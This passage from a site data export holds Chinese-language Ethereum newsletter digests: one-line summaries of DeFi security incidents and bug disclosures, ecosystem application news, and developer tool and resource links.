尾随交易(backrun)，否则它会被抢跑者抢跑\n\n\nOpenSea Shared Storefront配置漏洞, 允许出售卖家并没拥有的Shared Storefront NFT\n\n\n浏览器扩展钱包漏洞，允许以明文方式访问机密恢复短语，用户在导入非加密硬盘驱动器时查看了该短语，在MetaMask 补丁中修复\n\n\nCertora Prover 发现Maker不变量是一个变量\n\n\n以太坊和 Harmony 之间的 Horizon 桥1亿美元的漏洞, 5个多签地址中的2个被利用\n\n\n针对 DeFi Saver, Convex Finance 和 Ribbon Finance 的 Namecheap DNS 攻击 ; 请所有用户注意，在DeFi Saver上所有的代币批准都应该是给DSProxy(智能钱包)的，每笔交易中都要验证。\n\n\nXCarnival 380 万美元的漏洞利用，已撤销的质押 NFT 仍被用作质押，黑客利用这些质押从池中抽走资产。与攻击者协商了1500 ETH 赏金\n\n\nQuixotic NFT 市场14.5 万美元 的 Optimism 漏洞利用，已获批准的 ERC20 代币被盗，用户退款，Arbitrum 上的 Stratos 不受影响\n\n\nAnkr 提供的 Polygon 和 Fantom 公共 RPC 网关的DNS 劫持\n\n\nSynthetix 逻辑错误揭露, 悬赏15万美元\n\n\nYield滚动漏洞披露, 悬赏1万美元\n\n\nAxie/Ronin 桥6亿美元漏洞， 起因是虚假的offer的PDF\n\n\nsamczsun 破坏了一次窃密器攻击\n\n\nBiFi 1852 ETH漏洞被利用, 地址发布服务器密钥暴露\n\n\nOMNI 1300 ETH 漏洞被利用, onERC721Received 的重入攻击\n\n\nUniswap v3 LPs以空投代币网络钓鱼诈骗为目的\n\n\nMatthew Di Ferrante 文章：建立安全合约的过程\n\n\nPREMINT 300+ NFT 被盗, 恶意 JavaScript 利用了图像上传漏洞\n\n\nOpenZeppelin 合约公示: ERC165Checker 和 SignatureChecker 可能会回退的问题\n\n\nConsenSys Diligence 拍卖 40 小时的审计时间的 NFT\n\n\n历史重入攻击列表\n\n\nAudius 100万美元漏洞, 可升级合约中的存储冲突允许重新初始化\n\n\nBalancer披露DoS 漏洞（一个双重进入点漏洞），支付了5万美元赏金\n\n\nNomad 桥\n1.9亿美元漏洞利用\n, 无效消息在升级更改消息检查后被当做已证明的处理，漏洞利用有多个模仿者\n\n目前约20% 已被退回\n\n\n\n合约预审计检查\n\n\n项目需要用户提前同意10%的bug赏金奖励\n\n\nYield 遗漏函数重载（override）, Arbitrum有20.6万美元的风险\n\n\ndYdX 免gas费 漏洞披露, 悬赏2.5万美元\n\n\nOpenZeppelin Contracts ECDSA 签名延展性 安全咨询\n\n\nCurve finance DNS 被劫持， 通过 DNS 缓存”投毒“, 61.2万美元被盗\n\n\nSherlock 跨协议重入披露, 悬赏25万美金\n\n\nCeler 的 cBridge 前端DNS 缓存“中毒”\n\n\nNEAR Rainbow bridge再次被攻击未成功，看门狗检测到攻击并创建挑战交易\n\n\nWyvern 协议（p2p 兑换协议）内存覆盖漏洞披露\n\n\nPrimitive 34000美元的数学近似值错误，每 30 分钟 0.05 ETH 可以换成 1700 USDC\n\n\n构建安全合约的指南和最佳实践来\n\n\n8月17日针对 Celer 的BGP劫持攻击分析\n\n\n\nProfanity 地址生成器漏洞，私钥可以恢复，已被利用，将所有资产转移到不同的钱包\nPoW 分叉重放攻击，可能通过 EIP712 域缓存的合约进行攻击\nNFTX漏洞修复，攻击者可以从一个用户授权的 collection 中转移 NFT\nStarkEx v4.5 漏洞披露，从冻结系统的资金库中双花\nCompound cETH 喂价事件 - 事后分析\n\n\nWintermute（做市商）1.6 亿美元被利用，前面为零的交易地址遭到破坏，可能与Profanity地址生成器漏洞有关\n\n\nArbitrum 桥未初始化地址漏洞披露，悬赏 400 ETH ，赏金猎人6 个月前才开始学习 Solidity\n\n\nOpenZeppelin Contracts TimelockController 被多个项目错误配置，直到被撤销，部署者会一直拥有管理员权限。\n\n\ndYdX 恶意 npm 包发布\n\n\nMEV bot 0xbaD在套利约800个ETH之后 因漏洞损失 1101 个 ETH ， 攻击者用闪电贷调用实现设置 WETH 额度\n\n\n不到48小时的时间里，在 16GB 的 Macbook M1 上重建了 Wintermute 私钥\n\n\nBSC token hub（BNB信标链和BSC的跨链桥） 5.66 亿美元被利用\n:\n\n跨链桥验证的伪造信息铸造了的200万BNB\n1.1亿美元桥接到其他链\nBSC链停止，然后升级到冻结账户，禁用 BSC token hub 交易\n\n\n\ntransswap 跨链 DEX 2890 万美元漏洞，用任意外部调用转移批准的代币，攻击者被 arb bot 抢先获取 100 万美元\n\n\nTempleDAO 的 STAX 230万美元被利用, 访问控制缺失\n\n\nQANX Bridge 部署 120万被利用, 用 Profanity 的衍生工具生成的地址\n\n\nEFLeverVault 748 ETH 被利用, 闪电贷回调缺少确认检查, 幸运的是MEV bot 抢跑第一笔黑客交易 ，并归还480 ETH。\n\n\nRabby Swap 20万美元被利用, 随意外部调用, 撤销审批\n\n\nCurve LP 预言机漏洞披露, 只读重入, 100万美元面临风险\n\n\nDFX Finance 400万美元被利用, 闪电贷机制的重入\n\n\nZellic 的审计覆盖率跟踪器：跟踪某些DeFi协议的合约审计覆盖率，链上代码与审计代码之间存在差异\n\n\nevm-dafny : Dafny 中 EVM 的函数规范，允许对合约字节码进行验证\n\n\n形式化验证 WETH 合约，用 Z3 Theorem Prover 证明 Wrapped ETH 智能合约的安全性\n\n\n88mph漏洞披露，无人认领的奖励可能会从归属合约中扣除\n\n\nHybrid Echidna：Echidna（基于属性的模糊器）+ Maat（符号执行框架）通过使用符号分析生成模糊输入来改进随机模糊测试\n\n\nArbitrum 上的Lodestar Finance 价格预言机被操纵，580 万美元被利用\nSushiSwap Kashi 漏洞披露，可能会通过过时的汇率耗尽资金池\n\n\n审计时，处理代码库的总体流程 （Twitter）\n\n\n用 Foundry 重现DeFi 黑客攻击\n\n\nNotion的 bug 数据库，120+ 高严重性， 200+ 中等\n\n\nDamn Vulnerable DeFi v3\n\n\nslither v0.9.2，2个新检测器，集成了 OpenAI 的代码，可以生成 natspec 并用 GPT3 查找错误\n\n\n谨防多块 MEV 和复合治理\n\n\n2022 年以太坊安全审查\n\n\nEchidna v2.0.5（合约模糊器）：添加模拟（prank）功能用于覆盖下一次外部调用的 msg.sender\n\n\n只读重入解释\n\n\nOrion Protocol 价值 280 万美元的以太坊重入漏洞\n\n\nENS 子图空字节漏洞修复，仅使用子图无法区分相似域名，已支付 2万美元赏金\n\n\nPrestwich：LayerZero trusted-party 漏洞，应用程序默认设置将信任委托给 LayerZero 多重签名\n\n\ndForce 在 Arbitrum 和 Optimism 上通过 Curve 池只读重入，利用了约365万美元\n\n\nSperax USDs 在 Arbitrum 上 rebasing 代币，通过内部余额漏洞利用了~30 万美元，在确定攻击者后返还了资金\n\n\nCoW Swap 上的 Barter 求解器通过任意执行代码利用了约 16.6 万美元\n\n\nDexible150 万美元漏洞利用，获得批准的代币可以转移\n\n\ndForcenet资金在确定攻击者的 IP 和设备信息后返还\n\n\nBalancer Merkle Orchard 逻辑错误披露，320 万美元面临风险，已支付 50 ETH 赏金\n\n\nBeanstalk逻辑错误披露，310 万美元有风险，已支付 18.1 万美元的赏金\n\n\nSCSVS v2：更新的合约安全清单\n\n\n来自 Code4rena 竞赛的可利用合约漏洞分析[PDF]，80% 目前超出现有检测工具\n\n\nCounter Exploit Toolkit：可升级合约，具有任意存储写访问权限、代币和 ETH 提取、ETH 存款蜜罐和来自攻击者的代币转移\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/应用整理":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/应用整理","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/应用整理.md","title":"应用整理","links":[],"tags":[],"content":"\n\n社会选择理论与多结果投票\n\n\n召唤师 101：启动一个 MolochDAO 时可以有的心理准备\n\n\nSet Social Trading 已上线主网。自动复制你最喜欢的交易员的策略\n\n\n一个使用 ENS + 轻量级定向器访问协议的 URL 缩短器\n\n\nRocket：通过你的 NFT 来借钱，已上线 Ropsten 测试网\n\n\nSynthetix：Synthetix的现状以及 2020 路线图（将添加 ETH 为抵押品）\n\n\nDecentraland 的 Metaverse 版本放出，可以在一个 GUI（或者 SDK）上开发你的土地，还加入了一个 由 DAO 来治理的市场\n\n\nCompound 的锁仓资产超过 2 亿美元\n\n\nSynthetix 的 Achernar 版本发布，添加 ETH 作为质押品\n\n\nUniflash：一个去中心化的闪电贷协议，上线 Goerli 测试网\n\n\nOpyn：用 ETH 提供保险，赚取保费\n\n\n为代币分发建立流动性\n\n\nUnstoppable Domain 加入和基于 Chromium、运行本地 IPFS 节点的浏览器\n\n\n使用 Unlock + IPFS + ENS 销售音乐\n\n\nInstadapp 的 DeFi 账户帮助用户抽象掉了不必要的细节\n\n\nStatus 的通信机制和隐私\n\n\ndYdX 发布永续 BTCUSD 合约，支持 10 倍杠杆（仅在私有 alpha 版，美国的前端上不可用）\n\n\nFutureswap 上线主网，发布永续的 ETHDAI 合约，支持 20 倍杠杆\n\n\nOpyn 开发了一个带有订单簿的前端\n\n\nMaker 稳定费率变更，使用 USDC 担保的稳定费率为 6%，使用 ETH/BAT 担保的稳定费率为 0%。存款利率仍为 0。有 12 小时的治理激活延迟\n\n\nrTrees users 已为世界地球日植下 1541 棵树\n\n\nGolem 将重写代码，使 token 与 ERC20 标注兼容\n\n\nSignal、Telegram 与 Status 对比\n\n\nPoolTogether Pods：现在可以免信任地作为一个团体来购买彩票了\n\n\n2key：Zoom 的付费墙插件，基于以太坊\n\n\nDeFiZap 和 DeFiSnap 合并成了 ZapperFi：跟踪和交易双管齐下\n\n\nGnosis Safe apps：直接用 Gnosis Safe 界面与 app 交互\n\n\nOpenBazaar 现已支持 Eth\n\n\n一个针对 GasToken 转发的初步提议\n\n\nEverest：来自 TheGraph 和 MetaCartel 的项目注册器\n\n\nAugur v2 核心合约已经完成，代码已冻结，交易 UI 正在接受性能测试\n\n\nAave 改变了利率模型\n\n\nKyber 交易额突破 10 亿美元\n\n\nUniswap v2 启动、还加入了更多功能：直接的 token 交易对；价格预言机；闪电兑换，等等\n\n\nUMA 启动 ETHBTC 合成资产 token\n\n\nidle v3：稳定币收益再平衡器，添加了 dydx、USDT 和风险调整策略\n\n\nMaker 把 USDC 金库和 WBTC 金库的稳定费率分别调整至 .75% 和 1%\n\n\nArgent 智能合约钱包 v1 启动：支持一键访问 TokenSets、PoolTogether 和 Aave、Uniswap v2、Compound、Maker 和 Kyber\n\n\nEnjin 的 Minecraft 插件可以在你的服务器上把 Minecraft 物品代币化\n\n\nUmbra：给 ENS 域名的秘密支付，已运行在 Ropsten 测试网\n\n\nMaker 的 Oasis 去中心化交易所让开杠杆变得更容易\n\n\nDeFi777：把你的 ERC20 token 封装成 ERC777 token，然后通过 ENS 域名来互换\n\n\nRenVM 把 EBC、BCH 和 ZEC 带到以太坊上\n\n\nDeFi 锁定价值已达 60 亿美元（虽然我们都知道有重复计算问题）\n\n\n看起来像是庞氏骗局的 YAM 在代码还未审计时就启动了，市值一路上涨到 6 亿美元，随后一个 bug 冻结了 75 万美元；然后市值下降到了 4 亿美元。YAM token 价格曾上涨到 160 美元，现在降到了 1 美元以下。准备迁移到 v2\n\n\nCurveDAO 的推出历程颇有些戏剧化，导致大家指控有人预挖\n\n\nAave v2：单笔交易就可以偿还贷款，用 AAVE 来治理，推出了固定利率的存款服务，更少的 Gas 耗用量，等等\n\n\nMolochDAO v2.x：更高的 Gas 效率，用封装 token 来投票，接受 ETH\n\n\n1inch 推出 Mooniswap：流动性提供者可以通过超过 5 分钟的延迟价格获得部分永久损失\n\n\n在 100 万稳定币从 Tron 回流 ETH 之后，有超过 100 亿美元在以太坊上流动\n\n\nSynthetix 期货详解\n\n\nYieldSpace：一个自动化的流动性提供者，使用到期时间作为输入\n\n\nOpium 使用 AAVE 的信用委托做出了信用违约互换产品\n\n\nDeFi Safety：一个基于 “处理质量” 的评分表\n\n\nMultis 使用 Unlock 来自动化每月的月费支付\n\n\nHaseeb Qureshi：分解 Uniswap\n\n\nHasu：YAM 是一种 Nakamoto 方案\n\n\nMyCrypto：10 个步骤，保护你的数字钱包账户\n\n\nElaine Shi 的《分布式共识和区块链的基础》一书可免费获得\n\n\nBrave 正在研究在一个 POA 侧链上使用 AZTEC 的机密支付技术\n\n\nSergio Demian Lerner：Satoshi had an optimized miner he didn’t release publicly\n\n\nVitalik 论区块链合作的哲学及 n 分之 X 的信任模型\n\n\nUniswap 因为 SushiSwap 的流行而冲上了 DefiPulse 榜单（锁定价值）第一名\n\n\nSushiSwap 将累积 “归属于他们的 10%” 的代币换成 3.8 万 ETH（讽刺的是：他们正是通过 ZapperFi 前端使用 Uniswap 来兑换的）。许多人[都说这是一场退出诈骗](twitter.com/search scam&amp;src=typed_query)。Sushi 创始人说他还会继续参与，现在已经把控制权移交给 FTX 的 Sam Bankman-Fried。关于 Sushi 创始人是谁有很多谣言，但他都否认了\n\n\n出现了一些 Uniswap/Sushiswap 的跟风者\n\n\nBrave 的月活有用户已经有 1800 万\n\n\npool2 设计改变之后，Andre-狂热 再次爆发：需要在联合曲线中存入一种 LBI token，人们马上就开始在 Uniswap 上交易。Andre 事后评论：我不是为投机者而开发的\n\n\nPerez 等人的论文：分析 Compound 上的流动性\n\n\nNumerai Signals：成为终极对冲基金\n\n\nMakerDAO 要使用 Nexus Mutual 来覆盖损失吗？\n\n\nSynthetix 的 Kwenta 交易所已经上线\n\n\nB.Protocol 上线主网，其 Maker 清算者会将 50% 的清算成果还给用户\n\n\n使用 OpenLaw 的自动化法律服务\n\n\n[Aave v2 上线 Kovan 测试网Coinbase 中心化交易所的 Dai 价格被推高，导致 Compound 农民的贷款（总计 8500 万）被清算\n\n\nAave 的闪电贷在 2020 年的放贷额超过 10 亿美金\n\n\nGnosisDAO：治理 Gnosis 的财政和产品\n\n\n1inch 现在会把你的交易直接发送给矿工以避免被抢跑\n\n\nParadigm 的 Uniswap 问题：流动性提供者可以打败无常损失吗\n\n\nUMA 发布 Gas 期权 token\n\n\n根据 DeFiPulse，超过 200 亿美元锁定在 DeFi 应用中\n\n\nShapeshift 取消了 KYC，成了一个去中心化交易所的聚合器\n\n\nFutureswap v2 beta 已推出。使用信息输入机制获得实时的永续合约定价，使用者将得到不可转让的治理 token 作为奖励\n\n\nAragon 突发：整个团队因为治理不透明而辞职\n\n\nNotional finance 在主网上推出名义利率固定的贷款\n\n\nYield 使用闪电贷为 Maker 实现了固定利率、固定时限的贷款\n\n\n使用 Mintable 无需 Gas 生成 NFT\n\n\nCharm options 上线：没有信息输入机制，每个市场有 10 万美元的上限\n\n\n根据 DefiPulse，DeFi 应用的总锁仓价值达到 250 亿美元\n\n\nUMA：使用 ETH 免费借出 USDC（或许有负利率！）\n\n\nOpium 提供建立在 Compound 上的分层 CDO。一层是固定利率的；二层是浮动利率的\n\n\nSpendless —— 直接把你的稳定币储蓄收益转给慈善机构\n\n\n在 UMA 上做空 Bitcoin\n\n\nBalancer v2 将在未来几个月内上线：更少的 gas 消耗量；定制化的 AMM 逻辑；更高的资本效率；单个金库控制所有资产\n\n\n如何使用 Synthetix 来做空\n\n\nsynthetix 推出 $TSLA 股票合成资产，盘后在 Balancer 上交易\n\n\nMetaStable 推出了一个代币化 BTC 的资产组合：mBTC\n\n\nBAT 路线图 v2：重新设计的 Brave 密码学钱包、去中心化交易所聚合器，以及可能放在 layer-2 上的 Brave 自己的流动性池子\n\n\nLivepeer 提供的转码服务体量自去年夏天以来增长了 20 倍以上\n\n\nKyber 动态做市商 beta 已推出：交易的手续费率会随着波动性和可编程的定价曲线走高走低\n\n\nGnosisAuction 已推出：可服务于代币分发，通过批处理拍卖来抵抗抢跑攻击\n\n\nTornadoCash 推出了新的存款限额\n\n\n股票交易已在 Synthetix 的Kwenta 上线，从 6 个最大的美国科技股开始。\n\n\nUMA 合成 CryptoPunk 指数 Token index token\n\n\nUniswap V3 手续费计算器\n\n\n1inch 加入了 flashbot 交易\n\n\nCurve v2\n\n\n过去 12 个月借贷协议的体量可视化\n\n\none1INCH：1inch 发行的稳定币\n社区指责之后 MakerDAO 回击 Chainlink\nUniswap v3 流动性挖矿合约已部署到主网\n\n\nMaker 启用闪电铸币功能：0.05% 的费率即可闪电铸造出最高 5 亿的 DAI\n\n\ndaistats.com 按担保品类型显示 DAI 的铸币量，有不到 35% 的 DAI 是用 USDC 担保的\n\n\nAndre Cronje 发布了一个通往 Goerli 测试网的桥合约； Goerli 将有可能承载价值而不仅仅是个测试网\n\n\nEIP3664：下一代的游戏 NFT\n\n\nEIP3670：EOF – 代码验证\n\n\nMaker 基金会已停止运行，因为 MakerDAO 已足够去中心化\n\n\nTim Beiko 的 All Core Devs 系列更新：EIP 3675 的变更和 PoW 切换路线图\n\n\nEIP1559 相关的 JSON RPC 变更：加入了 0x02 事务类型，以及在区块头中加入了 baseFeePerGas 字段\n\n\nErigon 2021.07.05-alpha：遵守 SDG 规范的 Docker 构建\n\n\nGeth 研讨会视频\n\n\n用于默克尔根计算的 SHA256 优化：哈希速度提高了约 30%\n\n\n在树莓派 4 上运行 Erigon：完全验证的节点，只需不到 250 美元的硬件\n\n\n时间加权型的 AMM 设计\n\n\niceCream：授权的、不可转让、不可交易的治理 token\n\n\nAndre Cronje：使用期权的流动性挖矿奖励\n\n\nDAI 已使用定制的桥登陆 Arbitrum\n\n\nMaker 将 Gelato Network 的 DAI/USDC Uniswap v3 LP 添加为担保品，测试 1000 万美元的债务上限\n\n\n1inch 登陆 Arbitrum\n\n\nSynthetix 在 layer-1 上减少了合成资产并迁移到 layer 2 上\n\n\nENS DAO：用户可以按账户申领及委托治理代币；正在排除 token 农场账户\n\n\nAave v3 概览\n\n\nMaker DAI 直接存款模块：Aave 铸造 DAI 的特权渠道\n\n\nAelin 协议上线 Optimism\n\n\nReal World Asset 上线， 构建在Centrifuge和AAVE之上\n\n\nSperax 美元算法稳定币测试版在Arbitrum上线\n\n\nTokenized Time: 购买、出售和交易时间，概念验证\n\n\nbriq 可组合构建NFT, 在StarkNet上线alpha\n\n\nCryptopunks 去中心化市场（beta 版）, MIT 协议\n\n\nMovement: 基于3D浏览器的地址/ENS的画廊\n\n\nGnosis Guild的 Zodiac bridge module 允许一个网络上的DAO控制另一个网络上的资金（或其他交互）\n\n\nParis Hilton 在Twitter 使用 ENS\n\n\nReddit 社区积分 迁移到Arbitrum Nova\n\n\nSushiSwap AMM 在Arbitrum Nova上上线了。\n\n\nStratos NFT市场支持Arbitrum Nova。\n\n\nOpenSea 被盗物品政策需要警察报告来确认盗窃。\n\n\nGitcoin Passport：去中心化的身份，聚合了web2/web3认证印章\n\n\nDai 桥 在 Arbitrum Nova 可用了。\n\n\nENS: 创建了 200 万个域名，3.5 个月内创建 100 万个域名\n\n\nNimi beta v0.2:个人资料页面，默认为 eth.limo，通过 IPNS 进行无 gas 更新\n\n\ndm3: ENS 用户的加密消息，测试版\n\n\nSafe（原 Gnosis Safe）提议向用户分发代币\n\n\nKarma Discourse 插件显示用户的 DAO 声誉数据 [披露：Starbloom portfolio]\n\n\nCompound v2 cETH市场恢复， 还原到旧的价格oracle\n\n\nCoinbase提议从Maker那里托管USDC并支付利息\n\n\nUniswap Just in Time流动性研究\n\n\nVitalik对ENS基于需求的收费的想法和Nick的回应\n\n\nTrue Names (ENS)起诉GoDaddy以恢复eth.link。\n\n\n关于许可的隐私池的想法，以资助使用允许列表和阻止列表的新地址。\n\n\nMoonCats与Ponderware分离，过渡到副业。\n\n\nJonathan Mann的第5000首歌\n\n\nGitcoin Grants 使用防伪stamps 在 Ceramic 网络上计算可信bonus\n\n\nOpenSea支持Arbitrum Nova并加入了数据可用性委员会\n\n\nCoinbase cb.id ENS 域名: 可以通过他们的移动端钱包或插件来索取。\n\n\nInvisible NFTs: ENS绑定的NFTs可作为使用CC许可艺术的ENS简介中的头像使用。\n\n\n关于ENS隐私的提案 使用Aztec Network\n\n\nClique：在OP认证站点认证Twitter账户\n\n\nUniswap Permit2 生效，代币批准每 30 天过期一次，签名重新授权\n\n\nMaker 投票移除 Gemini USD 稳定币最后一刻落败，Paxos提供美国联邦基金利率的 45%\n\n\nMACI (anti-collusion) v1.1.1 : 添加无需重新注册即可授予用户更多投票权，减少贡献高度相关的匹配量和样本协调服务\n\n\n无罪证明：证明 Tornado Cash 的存款不是来自受制裁的地址\n\n\nUnlock Protocol 发布为活动 NFT 门票 的指南\n\n\n零知识应用简介\n\n\nETH 微小余额收集：用旧的交易类型（Type 0 交易）清除地址中的余额\n\n\nAave v3在主网上线\n\n\nRAI 稳定币：\n\nAmeen：对 ETH-only RAI 和无治理的反思\nVitalik：类 RAI 系统如何支持质押的 ETH\n\n\n\nIndex Coop多元化质押 ETH：Rocket Pool、Lido 和 StakeWise 的指数代币质押 ETH\n\n\nMaker 投票决定将 PSM 中的 1 亿美元 USDC 部署到 Yearn 保险库中\n\n\nMaple Finance 新增应收账款融资池\n\n\nMigratooor：将代币从一个地址移动到另一个地址\n\n\nMoonPlace： 一个类似于 r/Place NFT ，但在 Arbitrum Nova 上是链上 NFT，使用 using r/CryptoCurrency 社区 token\n\n\nTexture Punx：具有用户选择特征的链上 SVG NFT，50% 的二次销售捐赠给 Protocol Guild [披露：Andrew 铸造了三个，一个是免费的]\n\n\nOpenSea Seaport v1.2：批量列表、合约作为报价者、更强大的区域、改进的事件和优化\n\n\nSorare与英超联赛就球员 NFT 和梦幻足球达成许可协议\n\n\n加密协议不是公司也不是 DAO\n\n\n\nFlux Finance（代币化美国国债）在主网上运行，目前收益约为 4.3%，最低 10 万美元且需要 KYC\nbCSPX：S&amp;P UCITS ETF 的代币化跟踪器，仅限非美国合格投资者\nNexus Mutual v2部分索赔在主网上线，用于 FTX、BlockFi 和 Gemini 索赔\nAave 的 GHO 稳定币在 Goerli 测试网上上线\nSpark 协议使用 Element Finance 的Hyperdrive AMM在 Maker 上进行固定利率贷款，与 Aave 竞争\nSynthetix增加了 22 个永续期货市场，主要是加密市场和一些主要的外汇市场\ntBTC v2（更“无需信任”的 BTC）通过 optimistic 铸造\n声音策展人奖励：通过推荐链接获得音乐 NFT 铸币的 5%\n53% 的 DAO 代表从未投票\n\nNFT 市场：\n\nBlur 空投导致 gas 价格飙升\nBlur 更新的创作者版权政策，仅在 OpenSea 阻塞时强制执行全部版税\nOpenSea 将费用降至零（未指定时间），版权使用费可选（最低 0.5%），除非在链上强制执行，具有相同政策的市场不会被封锁\n\n\nOvertime（体育市场）扩展到 Arbitrum\nUMA oSnap：DAO 可以使用 UMA 的 optimistic 预言机执行链下快照投票\nRabbitHole v2（学习赚钱）：用户完成任务并铸造可交易 NFT 以领取奖励\nSynthetix v3部署在主网和 Optimism 上\nAave 投票决定在 v2 上冻结 BUSD 储备\nENS ETHDenver 自定义贴纸包预注册并设置您的头像\nNFT 市场大战：\n\nBlur NFT 交易量：20% 来自 15 个钱包，50% 来自 ~300 个钱包\n通过闪电贷完成 125k ETH NFT 清洗交易（0% 市场费用）\nUniswap：使用任何 ERC20 代币购买 NFT\nDankrad Feist 给创作者的解释：NFT 合约不能强制收取版税\n\n\nEthereum Postal Service：通过合约调用发送实体信件\nCoinbase COIN 的支持bCOIN标记化跟踪器，仅限非美国合格投资者\n账户抽象：\n\n部署在主网和 Optimism 上的ERC4337 EntryPoint 合约，用户操作被发送到私有内存池，打包器然后批处理并发送到 EntryPoint 执行\nSafe {Core} : 账户抽象栈\n\n\nMakerDAO 拒绝了Cogent Bank 的 1 亿美元贷款提议\n提议拯救错误发送给 Aave 的代币\nLlamaZip：UniswapV3 路由器通过压缩调用数据针对 Optimism 进行了优化\n以太坊见证服务在 Arbitrum 上线\n空投对 NFT 市场的影响分析\nPOAP Checkout：出售 POAP 以抵抗女巫攻击或在主网和 Arbitrum 上获得收入\n\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/开发者资料":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/开发者资料","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/开发者资料.md","title":"开发者资料","links":[],"tags":[],"content":"\n\n更好的 Solidity 调试体验：console.log 以及 stack traces\n\n\nABDK 在线工具：地址密钥、部署前预计算合约地址、RLP 编解码、编解码原始 已签名/未签名 交易\n\n\nSecurify v2：免费的安全扫描器\n\n\n使用 Web3j 及其 EVM 来审计你的代码\n\n\nSam Sun 在 Curve 中找出了一个漏洞，已解决\n\n\nBurner Wallet 插件是什么？定制化你的弹出事件\n\n\n如何使用任意消息桥来运行你自己的 xDai 链\n\n\n使用 CREATE2 解释器\n\n\nTruffle 和 WalletConnect 的意义\n\n\nAustin Griffith 的 eth.build 辨析智能合约\n\n\n使用 web3J Solidity 测试器\n\n\n介绍 symbolic execution\n\n\n在 Remix 中使用 MythX 的 symbolic execution 和模糊测试\n\n\nQ&amp;A：Sam Sun 如何发现漏洞\n\n\n前端安全最佳实践\n\n\n集成 MythX 和 CircleCI\n\n\n开始完成 OpenZeppelin CLI 工作流\n\n\nKauri 编选的资源库：学习 Eth app 开发\n\n\nNode-gyp-cache：缓存的原生依赖库\n\n\nweb3connect v1.0.0-beta.29：缓存用户上次的供应商以便自动加载\n\n\n新的 EthersJS 版本，带有升级后的 ENS 注册器地址\n\n\nweb3JS v1.2.6：更新 ENS 注册器地址和回滚原因描述\n\n\n在 OpenZeppelin Contracts 2.5 中使用 Create2.sol 库的指南\n\n\nSubspace v1.3：使用了新方法来跟踪区块、Gas Price 和区块时间\n\n\nPisa 的 any.sender：通过 API 用非托管的方法抽象掉你的交易\n\n\nBlocknative 的内部交易监控\n\n\n使用 Brownie 做基于属性的 Eth 代码测试\n\n\n把 Formality 编译到 Javascript\n\n\nTrueblocks 前端可让你获得所有自己运行节点才能提取出来的数据\n\n\n搭建你的 Eth 开发者环境\n\n\ncreate-Eth-app：用一条命令行创建 React 应用\n\n\n3Box Confidential Threads API\n\n\ndEth node 声称自己比 Ganache 快 60%\n\n\n围绕闪电贷（flash loan）模式的安全考量\n\n\nAustin Griffith 视频讲解闪电贷\n\n\n计算/累加 利息收益的模式\n\n\nSamczsun 和 Mudit Gupta 发现了 Nexus Mutual 合约的 bug\n\n\n使用 Remix test 做 Solidity 的单元测试，Part-2\n\n\nEmbark v5.2 ：支持代理合约、脚本执行\n\n\n使用 API 整合实时 websocket，帮助开发者入门以太坊\n\n\n可以在黑客松上尝试的 Eth2 项目\n\n\n使用 JSON-RPC 接口连接 Buidler EVM（从钱包连接前端），让 Solidity 堆栈追踪和控制台日志变得更有用\n\n\n用 Solidity 实现一个相连的表式结构\n\n\nSokt：一个用于 Java 和 Kotlin 的管理多种 Solidity 版本的库\n\n\n使用 OpenZeppelin 开发可升级合约的教程 , 中文翻译版本\n\n\ndApp 入门工具：Buidler + Waffle + TypeChain + Vue (TypeScript)\n\n\ntx2uml 可为所有的合约调用生成顺序图，哪怕是很大的交易也可以\n\n\nGas 补贴、1/64 规则、合约调用，以及 Gas 不足恶意攻击\n\n\nSolfuzz：使用 gray box fuzzing 的 Solidity 合约断言检查器\n\n\ngnark：Go 语言的更快 groth16 snark 验证器库\n\n\nSolidity v0.6.4, 中文文档\n\n\n利用 Solidity v0.6.4 为代理合约设计新的存储布局\n\n\nEthGlobal 的 以太坊开发者信息反馈\n\n\n体积节约 10 倍的 Javascript 签名器/验签器\n\n\n通过 Incubed 极轻客户端，使命令行与以太坊交互\n\n\nPrysmatic 的服务注册模式 Go 语言实现\n\n\n用 Node.js 实现默克尔树和帕特里夏树\n\n\nOpenZeppelin 指出恶意部署者可在你的 Ghosis Safe 多签名钱包里安装后门\n\n\nSmartBugs：执行 Solidity 自动化分析工具的框架，还附有一份对比不同工具性能的学术论文\n\n\nDeFiSaver：使用闪电贷，一键关闭 CDP\n\n\nGnosis 的 Gibralter：受监管的政治事件预测市场已经上线\n\n\nAugur v2 已经升级完成\n\n\nbZx 在攻击事件后的道歉。他们还在两周以前支付了 1inch 全额的 bug 赏金\n\n\nBluestone：固定存款及贷款利率，已上线 Rinkeby 测试网\n\n\n当 DeFi 遇上 rollup\n\n\n使用 Iden3 开发的 corcom 和 snarkjs 写出你的第一个零知识证明\n\n\nBrownie v1.7（基于 python 的 开发/测试 框架）。容易用命令行安装 github/EthPM 包。还有一个快速上手教程：通过 Brownie 来使用 OpenZeppelin 合约\n\n\nRemix 在线和桌面端 IDE v0.10：更多的 e2e 测试、在浏览器上的开发者节点、插件升级、发布到 IPFS、异步/等待脚本执行\n\n\nOpenZeppelin 测试环境 v0.1.4\n\n\ndshackle：Eth API 负载均衡器\n\n\n用闪电铸造资产来背书的 token\n\n\n使用 Temporal，直接从 ENS 管理器上传文件到 IPFS\n\n\nLoopring 发布了其 dex rollup 的 API\n\n\nSolidity 中的访问控制模式\n\n\nmoney-legos：用于开发 DeFi 应用的工具\n\n\nCertora 论他们在 Synthetix 中发现的可重入 Bug\n\n\nSlither v0.6.11：支持 Solidity v0.6，自动生成单元测试和模糊测试所需的属性\n\n\nCurve 在 Curve sUSD 代码中发现了一个漏洞。但资金是安全的\n\n\n本周发生了两个因 ERC-777 相关的重入攻击。ERC777 代币标准因具有回调能力，是众所周知易受重入攻击，ConsenSys Diligence 在 Uniswap 审计中就这么强调了，OpenZepplin 也在去年夏天公开了一个漏洞\n\n\n本周，一个 Uniswap 的 imBTC（ERC777 代币） 流动性池（约 1300 ETH）被攻击者用重入攻击抽干。Lendf.me 也遭到同样的攻击，损失了 2500 万美元。Peckshield 写了一个很棒的分析。（编者注：截至本文发出之时，Lendf.me 被黑事件中的黑客已归还所有被盗资金）\n\n\nTruffle v5.1.23：用于调试的堆栈跟踪器\n\n\nweb3js v1.2.7：新的自动重连功能的 Websocket，修复了许多 bug\n\n\nOpenZeppelin Contracts v3，合并到了 Solidity 